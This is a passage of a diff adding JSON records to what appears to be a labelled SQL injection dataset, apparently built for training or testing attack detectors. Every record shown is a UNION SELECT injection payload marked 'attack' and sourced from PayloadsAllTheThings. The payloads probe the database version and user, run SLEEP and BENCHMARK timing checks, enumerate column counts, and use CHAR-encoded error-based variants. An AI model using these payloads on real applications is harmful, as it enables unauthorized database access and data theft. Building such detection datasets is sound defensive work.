+    "text": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9#",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10#",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11#",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12#",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13#",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14#",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15#",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16#",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17#",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18#",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT USER()--",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT SLEEP(5)--",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT USER(),SLEEP(5)--",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5)--",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A'))--",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL--",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL--",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL--",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL--",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL--",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL--",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT NULL--",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))--",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))--",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))--",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))--",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))--",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))--",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))--",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))--",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))--",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))--",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))--",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))--",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))--",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))--",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))--",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))--",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))--",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))--",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))--",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT NULL#",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))#",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))#",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))#",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))#",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))#",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))#",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))#",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))#",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))#",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))#",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))#",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))#",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))#",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))#",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))#",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))#",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))#",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))#",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))#",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT NULL",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
